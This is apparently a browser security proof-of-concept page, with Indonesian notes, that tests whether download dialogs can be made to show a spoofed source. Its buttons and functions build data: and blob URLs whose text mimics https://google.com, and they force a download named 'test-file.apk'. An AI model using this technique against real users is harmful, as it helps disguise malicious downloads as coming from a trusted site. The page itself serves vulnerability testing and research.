<!doctype html>
<html>
<head><meta charset="utf-8"><title>PoC: data: variations</title>
<style>
  body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:20px;max-width:900px}
  button{margin:6px;padding:8px 12px}
  pre{background:#f6f6f6;padding:10px;border-radius:6px}
  .note{color:#444;font-size:0.95rem}
</style>
</head>
<body>
  <h2>PoC â€” data: variations (download dialog test)</h2>
  <p class="note">Tes hanya di lingkungan pengujianmu. Klik tombol lalu perhatikan teks pada dialog download.</p>

  <div>
    <button onclick="dl('data: ,blank')">data: + space Tombol 1</button>
    <button onclick="dl('data:text/plain,source%3A%20https%3A%2F%2Fgoogle.com')">data: URL-encoded 'https://google.com'  Tombol 2</button>
    <button onclick="dl('data:text/plain,https://google.com,more')">data:https://google.com,more (naive)  Tombol 3</button>
  </div>

  <div style="margin-top:8px">
  </div>

  <h3>Console / Info</h3>
  <pre id="log">Ready. Klik tombol untuk membuat download.</pre>

<script>
function log(s){ document.getElementById('log').textContent = s; }

// helper to create anchor and force download
function doAnchor(href, name){
  log('Creating anchor:\\n href: ' + href + '\\n filename: ' + name);
  const a = document.createElement('a');
  a.href = href;
  a.download = name;
  document.body.appendChild(a);
  a.click();
  a.remove();
}

// generic download wrapper
function dl(href){
  // choose filename visible to user
  const name = 'test-file.apk';
  doAnchor(href, name);
}

/* base64 variant */
function dlBase64(){
  const html = '<html><body>from https://google.com <a href="https://google.com">link</a></body></html>';
  const b64 = btoa(unescape(encodeURIComponent(html)));
  const uri = 'data:text/html;base64,' + b64;
  doAnchor(uri, 'b64file.html');
}

/* blob variant */
function dlBlob(){
  const html = '<html><body>blob content => from https://google.com</body></html>';
  const blob = new Blob([html], { type: 'text/html' });
  const url = URL.createObjectURL(blob);
  doAnchor(url, 'from-blob.html');
  // revoke after a bit
  setTimeout(()=>{ URL.revokeObjectURL(url); log('Revoked object URL: ' + url); }, 5000);
}
</script>
</body>
</html>
